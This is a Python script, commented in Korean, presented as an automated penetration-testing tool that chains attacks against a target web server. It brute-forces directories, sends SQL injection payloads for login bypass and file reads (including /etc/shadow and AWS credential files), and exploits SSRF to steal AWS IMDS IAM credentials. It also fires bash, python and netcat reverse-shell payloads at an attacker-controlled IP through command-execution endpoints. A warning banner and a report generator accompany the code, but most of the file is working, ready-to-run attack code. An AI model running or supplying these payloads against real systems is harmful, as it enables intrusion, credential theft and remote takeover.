#!/usr/bin/env python3
"""
Full Penetration Testing Automation Script
완전 자동화 침투 테스트 스크립트

WARNING: 이 스크립트는 사전 승인된 침투 테스트에만 사용하세요.
무단 사용은 불법입니다.
"""

import requests
import subprocess
import json
import time
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional
import base64
import re

class PenetrationTester:
    def __init__(self, target: str, attacker_ip: str):
        self.target = target
        self.attacker_ip = attacker_ip
        self.session = requests.Session()
        self.vulnerabilities = []
        self.results = {
            'reconnaissance': {},
            'sql_injection': {},
            'ssrf': {},
            'reverse_shell': {},
            'privilege_escalation': {},
            'data_exfiltration': {},
        }

    def log(self, level: str, message: str):
        """로그 출력"""
        colors = {
            'INFO': '\033[94m',
            'SUCCESS': '\033[92m',
            'WARNING': '\033[93m',
            'ERROR': '\033[91m',
            'ENDC': '\033[0m'
        }
        color = colors.get(level, colors['INFO'])
        print(f"{color}[{level}]{colors['ENDC']} {message}")

    # ========== Phase 1: Reconnaissance ==========

    def phase1_reconnaissance(self):
        """Phase 1: 정찰"""
        self.log('INFO', '=== Phase 1: Reconnaissance ===')

        # 1. Port Scanning
        self.log('INFO', 'Running port scan...')
        self.nmap_scan()

        # 2. Directory Bruteforce
        self.log('INFO', 'Running directory bruteforce...')
        self.directory_scan()

        # 3. Backup File Discovery
        self.log('INFO', 'Searching for backup files...')
        self.find_backup_files()

        # 4. Technology Detection
        self.log('INFO', 'Detecting technology stack...')
        self.detect_technology()

    def nmap_scan(self):
        """Nmap 포트 스캔"""
        try:
            cmd = f"nmap -sV -sC -p- {self.target} -oN nmap_scan.txt"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)

            # 열린 포트 파싱
            open_ports = re.findall(r'(\d+)/tcp\s+open', result.stdout)
            self.results['reconnaissance']['open_ports'] = open_ports
            self.log('SUCCESS', f'Found {len(open_ports)} open ports: {", ".join(open_ports)}')

        except subprocess.TimeoutExpired:
            self.log('ERROR', 'Nmap scan timeout')
        except Exception as e:
            self.log('ERROR', f'Nmap scan failed: {str(e)}')

    def directory_scan(self):
        """디렉토리 브루트포스"""
        wordlist = [
            'admin', 'login', 'api', 'backup', 'config', 'upload',
            'uploads', 'test', 'dev', 'old', 'new', 'tmp', 'temp'
        ]

        found_dirs = []
        for word in wordlist:
            url = f"http://{self.target}/{word}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 301, 302, 403]:
                    found_dirs.append(word)
                    self.log('SUCCESS', f'Found directory: /{word} ({response.status_code})')
            except:
                pass

        self.results['reconnaissance']['directories'] = found_dirs

    def find_backup_files(self):
        """백업 파일 탐색"""
        files = ['index', 'login', 'config', 'database', 'admin', 'api/health']
        extensions = ['php', 'asp', 'aspx']
        backup_suffixes = ['.bak', '.old', '.backup', '.orig', '~', '.swp']

        found_backups = []
        for file in files:
            for ext in extensions:
                for suffix in backup_suffixes:
                    url = f"http://{self.target}/{file}.{ext}{suffix}"
                    try:
                        response = self.session.get(url, timeout=5)
                        if response.status_code == 200:
                            found_backups.append(url)
                            self.log('SUCCESS', f'Found backup: {url}')

                            # 소스코드 저장
                            with open(f'backup_{file}_{ext}{suffix}', 'w') as f:
                                f.write(response.text)
                    except:
                        pass

        self.results['reconnaissance']['backup_files'] = found_backups

    def detect_technology(self):
        """기술 스택 탐지"""
        try:
            response = self.session.get(f"http://{self.target}", timeout=10)

            headers = response.headers
            tech_stack = {
                'server': headers.get('Server', 'Unknown'),
                'x_powered_by': headers.get('X-Powered-By', 'Unknown'),
                'cookies': list(response.cookies.keys())
            }

            self.results['reconnaissance']['technology'] = tech_stack
            self.log('SUCCESS', f'Server: {tech_stack["server"]}')
            self.log('SUCCESS', f'X-Powered-By: {tech_stack["x_powered_by"]}')

        except Exception as e:
            self.log('ERROR', f'Technology detection failed: {str(e)}')

    # ========== Phase 2: SQL Injection ==========

    def phase2_sql_injection(self):
        """Phase 2: SQL Injection"""
        self.log('INFO', '=== Phase 2: SQL Injection ===')

        # 1. Authentication Bypass
        self.log('INFO', 'Testing authentication bypass...')
        self.sql_auth_bypass()

        # 2. Union-based SQLi
        self.log('INFO', 'Testing UNION-based SQL injection...')
        self.sql_union_based()

        # 3. Time-based Blind SQLi
        self.log('INFO', 'Testing time-based blind SQL injection...')
        self.sql_time_based()

    def sql_auth_bypass(self):
        """SQL Injection 인증 우회"""
        payloads = [
            "admin' OR '1'='1'-- -",
            "admin' OR 1=1-- -",
            "' OR '1'='1'-- -",
            "admin'-- -",
            "admin' #",
        ]

        for payload in payloads:
            try:
                data = {
                    'username': payload,
                    'password': 'test'
                }
                response = self.session.post(f"http://{self.target}/login.php", data=data, timeout=10)

                if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower():
                    self.log('SUCCESS', f'SQL Injection successful: {payload}')
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'CRITICAL',
                        'payload': payload,
                        'url': f"http://{self.target}/login.php"
                    })
                    return True

            except Exception as e:
                self.log('ERROR', f'SQL injection test failed: {str(e)}')

        self.log('WARNING', 'No SQL injection bypass found')
        return False

    def sql_union_based(self):
        """UNION-based SQL Injection"""
        # 컬럼 수 확인
        for i in range(1, 10):
            payload = f"' UNION SELECT {','.join(['NULL'] * i)}-- -"
            data = {'username': payload, 'password': 'test'}

            try:
                response = self.session.post(f"http://{self.target}/login.php", data=data, timeout=10)
                if response.status_code == 200 and 'error' not in response.text.lower():
                    self.log('SUCCESS', f'Found {i} columns')
                    self.results['sql_injection']['columns'] = i

                    # 데이터 추출 시도
                    extract_payload = f"' UNION SELECT {','.join(['NULL'] * (i-1))},database()-- -"
                    data['username'] = extract_payload
                    response = self.session.post(f"http://{self.target}/login.php", data=data)

                    # 데이터베이스 이름 추출
                    match = re.search(r'Database:\s*(\w+)', response.text)
                    if match:
                        self.log('SUCCESS', f'Database name: {match.group(1)}')

                    return True
            except:
                pass

        return False

    def sql_time_based(self):
        """Time-based Blind SQL Injection"""
        payload = "admin' AND SLEEP(5)-- -"
        data = {'username': payload, 'password': 'test'}

        try:
            start_time = time.time()
            self.session.post(f"http://{self.target}/login.php", data=data, timeout=15)
            elapsed = time.time() - start_time

            if elapsed >= 5:
                self.log('SUCCESS', f'Time-based SQLi confirmed (delay: {elapsed:.2f}s)')
                self.vulnerabilities.append({
                    'type': 'Time-based Blind SQL Injection',
                    'severity': 'HIGH',
                    'payload': payload
                })
                return True

        except Exception as e:
            self.log('ERROR', f'Time-based SQLi test failed: {str(e)}')

        return False

    # ========== Phase 3: SSRF & AWS IMDS ==========

    def phase3_ssrf_and_imds(self):
        """Phase 3: SSRF & AWS IMDS"""
        self.log('INFO', '=== Phase 3: SSRF & AWS IMDS ===')

        # 1. SSRF 확인
        if self.test_ssrf():
            # 2. AWS IMDS 공격
            self.attack_imds()

    def test_ssrf(self) -> bool:
        """SSRF 취약점 테스트"""
        ssrf_endpoints = [
            f"http://{self.target}/api/health.php",
            f"http://{self.target}/check.php",
            f"http://{self.target}/fetch.php"
        ]

        test_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22",
            f"http://{self.attacker_ip}:8080/callback"
        ]

        for endpoint in ssrf_endpoints:
            for test_url in test_urls:
                try:
                    response = self.session.get(
                        endpoint,
                        params={'url': test_url},
                        timeout=10
                    )

                    if response.status_code == 200 and len(response.text) > 0:
                        self.log('SUCCESS', f'SSRF found: {endpoint}?url={test_url}')
                        self.results['ssrf']['endpoint'] = endpoint
                        return True

                except:
                    pass

        self.log('WARNING', 'No SSRF vulnerability found')
        return False

    def attack_imds(self):
        """AWS IMDS 공격"""
        if 'endpoint' not in self.results.get('ssrf', {}):
            self.log('ERROR', 'No SSRF endpoint available')
            return

        endpoint = self.results['ssrf']['endpoint']

        # 1. IAM 역할 확인
        try:
            response = self.session.get(
                endpoint,
                params={'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'},
                timeout=10
            )

            if response.status_code == 200:
                role_name = response.text.strip()
                self.log('SUCCESS', f'Found IAM role: {role_name}')

                # 2. 자격증명 탈취
                cred_response = self.session.get(
                    endpoint,
                    params={'url': f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'},
                    timeout=10
                )

                if cred_response.status_code == 200:
                    credentials = json.loads(cred_response.text)
                    self.results['ssrf']['credentials'] = credentials

                    self.log('SUCCESS', 'AWS Credentials stolen:')
                    self.log('INFO', f"  AccessKeyId: {credentials.get('AccessKeyId')}")
                    self.log('INFO', f"  SecretAccessKey: {credentials.get('SecretAccessKey')}")

                    # 저장
                    with open('aws_credentials.json', 'w') as f:
                        json.dump(credentials, f, indent=2)

                    self.vulnerabilities.append({
                        'type': 'SSRF + AWS IMDS',
                        'severity': 'CRITICAL',
                        'impact': 'AWS credentials compromised'
                    })

        except Exception as e:
            self.log('ERROR', f'IMDS attack failed: {str(e)}')

    # ========== Phase 4: Reverse Shell ==========

    def phase4_reverse_shell(self):
        """Phase 4: Reverse Shell"""
        self.log('INFO', '=== Phase 4: Reverse Shell ===')

        # Reverse Shell 페이로드
        payloads = [
            f"bash -c 'bash -i >& /dev/tcp/{self.attacker_ip}/4444 0>&1'",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            f"nc {self.attacker_ip} 4444 -e /bin/bash"
        ]

        # RCE 엔드포인트
        rce_endpoints = [
            f"http://{self.target}/api/health.php?check=custom&cmd=",
            f"http://{self.target}/shell.php?cmd=",
            f"http://{self.target}/uploads/shell.php?cmd="
        ]

        for endpoint in rce_endpoints:
            for payload in payloads:
                try:
                    self.log('INFO', f'Trying reverse shell: {endpoint}')
                    response = self.session.get(endpoint + payload, timeout=5)

                    if response.status_code == 200:
                        self.log('SUCCESS', 'Reverse shell triggered!')
                        self.log('INFO', f'Check listener on port 4444')
                        return True

                except:
                    pass

        self.log('WARNING', 'Reverse shell failed')
        return False

    # ========== Phase 5: Data Collection ==========

    def phase5_data_collection(self):
        """Phase 5: 데이터 수집"""
        self.log('INFO', '=== Phase 5: Data Collection ===')

        # 수집할 파일 목록
        target_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/var/www/html/.env',
            '/var/www/html/config.php',
            '/home/ubuntu/.aws/credentials',
            '/root/.aws/credentials'
        ]

        collected_data = {}

        for file_path in target_files:
            try:
                # SQL Injection file read
                payload = f"' UNION SELECT LOAD_FILE('{file_path}')-- -"
                data = {'username': payload, 'password': 'test'}
                response = self.session.post(f"http://{self.target}/login.php", data=data, timeout=10)

                if response.status_code == 200 and len(response.text) > 100:
                    self.log('SUCCESS', f'Collected: {file_path}')
                    collected_data[file_path] = response.text

                    # 저장
                    safe_filename = file_path.replace('/', '_')
                    with open(f'exfil_{safe_filename}', 'w') as f:
                        f.write(response.text)

            except Exception as e:
                self.log('ERROR', f'Failed to collect {file_path}: {str(e)}')

        self.results['data_exfiltration'] = collected_data

    # ========== Report Generation ==========

    def generate_report(self):
        """침투 테스트 보고서 생성"""
        self.log('INFO', '=== Generating Report ===')

        report = {
            'target': self.target,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': self.vulnerabilities,
            'results': self.results,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM']),
            }
        }

        # JSON 저장
        with open('pentest_report.json', 'w') as f:
            json.dump(report, f, indent=2)

        # Markdown 리포트
        markdown_report = f"""# Penetration Testing Report

## Target Information
- **Target**: {self.target}
- **Test Date**: {report['timestamp']}
- **Tester**: Automated Script

## Executive Summary
- **Total Vulnerabilities**: {report['summary']['total_vulnerabilities']}
- **Critical**: {report['summary']['critical']}
- **High**: {report['summary']['high']}
- **Medium**: {report['summary']['medium']}

## Vulnerabilities Found

"""

        for idx, vuln in enumerate(self.vulnerabilities, 1):
            markdown_report += f"""### {idx}. {vuln['type']} ({vuln['severity']})
- **Payload**: `{vuln.get('payload', 'N/A')}`
- **URL**: {vuln.get('url', 'N/A')}
- **Impact**: {vuln.get('impact', 'N/A')}

"""

        markdown_report += """## Recommendations

1. Fix SQL Injection vulnerabilities
2. Disable SSRF endpoints or implement strict URL validation
3. Disable AWS IMDS v1, use IMDSv2
4. Remove backup files from web directory
5. Implement Web Application Firewall (WAF)
6. Regular security audits

---

**Report generated by Automated Penetration Testing Script**
"""

        with open('pentest_report.md', 'w') as f:
            f.write(markdown_report)

        self.log('SUCCESS', 'Report saved: pentest_report.json, pentest_report.md')

    # ========== Main Execution ==========

    def run_all_phases(self):
        """모든 Phase 실행"""
        try:
            self.phase1_reconnaissance()
            time.sleep(2)

            self.phase2_sql_injection()
            time.sleep(2)

            self.phase3_ssrf_and_imds()
            time.sleep(2)

            self.phase4_reverse_shell()
            time.sleep(2)

            self.phase5_data_collection()

        except KeyboardInterrupt:
            self.log('WARNING', 'Testing interrupted by user')
        except Exception as e:
            self.log('ERROR', f'Unexpected error: {str(e)}')
        finally:
            self.generate_report()


def main():
    parser = argparse.ArgumentParser(description='Full Penetration Testing Automation')
    parser.add_argument('target', help='Target IP or domain (e.g., 3.35.218.180)')
    parser.add_argument('attacker_ip', help='Your Kali Linux IP')
    parser.add_argument('--phase', type=int, help='Run specific phase only (1-5)')

    args = parser.parse_args()

    print("""
╔═══════════════════════════════════════════════════════╗
║   Full Penetration Testing Automation Script         ║
║                                                       ║
║   WARNING: Use only on authorized systems!           ║
║   Unauthorized access is illegal.                    ║
╚═══════════════════════════════════════════════════════╝
    """)

    print(f"[*] Target: {args.target}")
    print(f"[*] Attacker IP: {args.attacker_ip}")
    print()

    tester = PenetrationTester(args.target, args.attacker_ip)

    if args.phase:
        phases = {
            1: tester.phase1_reconnaissance,
            2: tester.phase2_sql_injection,
            3: tester.phase3_ssrf_and_imds,
            4: tester.phase4_reverse_shell,
            5: tester.phase5_data_collection
        }

        if args.phase in phases:
            phases[args.phase]()
            tester.generate_report()
        else:
            print(f"[ERROR] Invalid phase: {args.phase}")
    else:
        tester.run_all_phases()


if __name__ == '__main__':
    main()
